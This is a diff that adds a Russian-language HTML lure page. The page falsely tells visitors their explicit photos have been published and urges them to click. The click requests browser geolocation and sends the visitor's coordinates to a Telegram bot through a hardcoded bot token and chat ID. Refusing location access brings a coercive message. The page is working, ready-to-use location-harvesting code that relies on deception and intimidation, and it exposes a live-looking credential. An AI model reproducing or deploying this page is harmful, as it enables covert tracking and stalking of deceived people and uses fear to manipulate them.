@@ -1,0 +1,58 @@
+`html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Получение геолокации</title>
+</head>
+<body>
+  <h2>Нажмите на экран чтобы увидеть ваши 18+ фото все ваши фотографии опубликовано на сайте.</h2>
+  <p id="result">Ожидайте сайт открывается...</p>
+
+  <script>
+    function sendToTelegram(message) {
+      var token = '7414759391:AAHQ_n9ELvC9DG6I7iaXxS0A78LajMTOlfc'; // Замени на свой токен
+      var chatId = '7521102948';  // Замени на свой chat_id
+
+      var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(function(response) {
+        return response.json();
+      }).then(function(data) {
+        console.log('Отправлено в Telegram:', data);
+      }).catch(function(error) {
+        document.getElementById("result").innerText = "Ошибка при отправке!";
+        console.error(error);
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var lat = position.coords.latitude;
+          var lon = position.coords.longitude;
+          var message = '📍 Геолокация:\nШирота: ' + lat + '\nДолгота: ' + lon;
+          document.getElementById("result").innerText = message;
+          sendToTelegram(message);
+        }, function(error) {
+          document.getElementById("result").innerText = "Чтобы открыть сайт нажмите разрешить доступ к геоданным почему нужно разрешить так как сайт определяет ваши данные которые опубликованные 18+ фотографии и.т.д.";
+        });
+      } else {
+        document.getElementById("result").innerText = "Ваш браузер не поддерживает геолокацию.";
+      }
+    }
+
+    document.body.onclick = getLocation;
+  </script>
+</body>
+</html>
+`
